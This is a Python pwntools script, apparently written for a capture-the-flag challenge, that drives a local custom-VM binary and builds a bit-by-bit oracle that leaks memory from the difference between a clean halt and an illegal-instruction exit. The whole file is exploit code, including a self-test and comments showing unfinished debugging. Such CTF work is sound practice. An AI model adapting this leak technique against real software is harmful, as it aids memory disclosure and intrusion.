#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

# VM instruction encoders
def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def pop_reg(reg):
    return bytes([0x03, reg])

def and_reg_imm(reg, imm32):
    return bytes([0x48, reg]) + p32(imm32)

def shr_reg_imm(reg, imm32):
    return bytes([0x49, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_bit_test_code(read_addr, bit_position, expected_bit):
    """
    Create code that:
    1. Reads 4 bytes from read_addr
    2. Extracts bit at bit_position
    3. Returns TERMINATED if bit == expected_bit, ILLEGAL otherwise
    """
    code = b''
    
    # Set SP to read_addr (the low byte determines offset within page)
    code += mov_reg_imm(15, read_addr)
    
    # Pop value into r0
    code += pop_reg(0)
    
    # Shift right to get target bit into position 0
    if bit_position > 0:
        code += shr_reg_imm(0, bit_position)
    
    # Mask to get just bit 0
    code += and_reg_imm(0, 1)
    
    # Load expected bit value into r1
    code += mov_reg_imm(1, expected_bit)
    
    # Compare
    code += cmp_reg_reg(0, 1)
    
    # Calculate HLT offset
    current = len(code)
    hlt_offset = current + 6 + 2 + 1  # mov + jne + illegal
    
    # mov r2, hlt_offset
    code += mov_reg_imm(2, hlt_offset)
    
    # JNE jumps when equal
    code += jne_reg(2)
    
    # Illegal (not equal)
    code += trigger_illegal()
    
    # HLT (equal)
    code += hlt()
    
    return code

def test_bit(read_addr, bit_position):
    """Test if bit at position is 1. Returns True if 1, False if 0."""
    # Test if bit == 1
    code = create_bit_test_code(read_addr, bit_position, 1)
    
    p = process(['./mqda'], level='error')
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_byte(read_addr):
    """Leak a single byte using bit-by-bit oracle."""
    byte_val = 0
    for bit in range(8):
        if test_bit(read_addr, bit):
            byte_val |= (1 << bit)
    return byte_val

def leak_dword(read_addr):
    """Leak a 32-bit value."""
    val = 0
    for bit in range(32):
        if test_bit(read_addr, bit):
            val |= (1 << bit)
    return val

def main():
    print("[*] Testing bit leak functionality...")
    
    # Test by reading our own code
    # At address 0, offset 0, we read code[0..3]
    # First instruction is mov r15, addr = [0x41, 0x0f, ...]
    # But wait, the first instruction IS the mov_reg_imm(15, read_addr)
    # So the code we read is itself!
    
    # Let's read from a fixed address and verify
    # Read from address 0, which contains our code
    
    # Actually this is a chicken-and-egg problem - the code we read
    # includes the address we're reading from, which changes the code!
    
    # Let's read from a different page that we set up first
    # Actually no, let's just test with a known pattern
    
    print("[*] Leaking first dword at address 0...")
    
    # We'll read 32 bits one at a time
    leaked = 0
    for bit in range(32):
        sys.stdout.write(f"\r[*] Leaking bit {bit}/32...")
        sys.stdout.flush()
        if test_bit(0, bit):
            leaked |= (1 << bit)
    
    print(f"\n[+] Leaked value: 0x{leaked:08x}")
    
    # The leaked value should be the first 4 bytes of our test code
    # which is mov r15, 0 = [0x41, 0x0f, 0x00, 0x00, 0x00, 0x00]
    # First dword = 0x00000f41
    
    expected = 0x00000f41  # mov r15, 0
    print(f"[*] Expected: 0x{expected:08x}")
    
    if leaked == expected:
        print("[+] Leak verified!")
    else:
        print("[-] Leak mismatch - need to debug")

if __name__ == '__main__':
    main()
